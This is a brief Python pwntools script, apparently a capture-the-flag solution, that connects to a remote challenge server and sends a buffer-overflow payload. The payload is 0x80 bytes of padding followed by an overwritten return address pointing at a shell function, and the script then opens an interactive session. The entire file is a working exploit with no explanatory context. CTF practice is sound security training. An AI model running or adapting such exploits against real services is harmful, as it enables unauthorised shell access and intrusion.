#!/usr/bin/python3

import pwn

p = pwn.remote("ctf.j0n9hyun.xyz", 3001)

shell = 0x0804849b
padding = b"A"*0x80

payload = padding + pwn.p32(shell)

p.sendline(payload)

p.interactive()
